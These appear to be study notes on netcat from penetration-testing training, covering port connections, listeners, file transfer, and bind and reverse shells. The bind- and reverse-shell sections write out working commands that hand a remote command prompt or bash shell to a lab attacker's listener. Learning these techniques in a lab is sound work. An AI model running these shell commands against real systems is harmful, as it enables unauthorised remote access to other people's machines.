Netcat

Reads and writes data across network connections, using TCP or UDP protocols.

nc -nv 10.11.0.22 110 connect to TCP port 110 (POP3 mail server) on 10.11.0.22, -n to skip DNS name resolution, -v to add verbosity, if the port is open the server responds with welcome message and prompt us to log in 
nc -nlvp 4444  listen for incoming connection on TCP port 4444, -l to listen, -p to specify port no 

Transfer Files

c:\win> nc -nlvp 4444 > incoming.exe 
on windows set up a listener and redirect output to file incoming.exe
kali@linux:~$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe  transfer file wget.exe from linux to windows  

Bind Shell

Listener on target and attacker connect to target to gain remote shell.

c:\target> nc -nlvp 4444 -e cmd.exe
-e executes a program after making or receiving a successful connection 
kali@attacker:~$ nc -nv 10.11.0.22 4444 
after connecting linux is presented with win's command prompt 

Reverse Shell

Listener on attacker and target connects to listener with a shell.

This helps when target is behind a NAT, having a private IP address and behind a firewall.

c:\atk> nc -nlvp 4444  win attacker runs a listener 
kali@trgt:~$ nc -nv 10.11.0.22 4444 -e /bin/bash  linux target connects to the attacker and after connection win is presented with kali bash shell
